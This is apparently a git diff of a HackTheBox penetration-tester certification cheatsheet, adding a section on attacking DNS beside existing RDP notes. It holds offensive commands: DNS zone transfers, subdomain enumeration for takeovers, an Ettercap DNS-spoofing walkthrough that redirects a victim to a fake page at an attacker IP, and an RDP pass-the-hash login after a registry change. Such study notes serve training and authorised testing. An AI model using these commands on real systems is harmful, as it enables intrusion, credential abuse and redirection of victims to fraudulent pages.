@@ -55,6 +55,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking SMB](#attacking-smb)
     - [Attacking SQL](#attacking-sql)
     - [Attacking RDP](#attacking-rdp)
+    - [Attacking DNS](#attacking-dns)
     - [Attacking Email Services](#attacking-email-services)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
@@ -1108,6 +1109,36 @@ net start sessionhijack
 # RDP Pass-the-Hash (PtH)
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+
+```
+##### Attacking DNS
+```
+nmap -p53 -Pn -sV -sC 10.10.110.213
+
+# DNS Zone Transfer - DIG - AXFR Zone Transfer
+dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+fierce --domain zonetransfer.me
+
+# Domain Takeovers & Subdomain Enumeration
+./subfinder -d inlanefreight.com -v
+
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+cd subbrute
+echo "ns1.inlanefreight.com" > ./resolvers.txt
+./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
+
+host support.inlanefreight.com
+
+The can-i-take-over-xyz repository is also an excellent reference for a subdomain takeover vulnerability.
+
+# DNS Spoofing
+> cat /etc/ettercap/etter.dns  >>> to be >>> targetdomian.io	A	Attacker_IP
+> Start Ettercap
+> navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
+> Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
+> After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:
+
+> ping inlanefreight.com
 
 ```
 # DNS lookup for mail servers for the specified domain
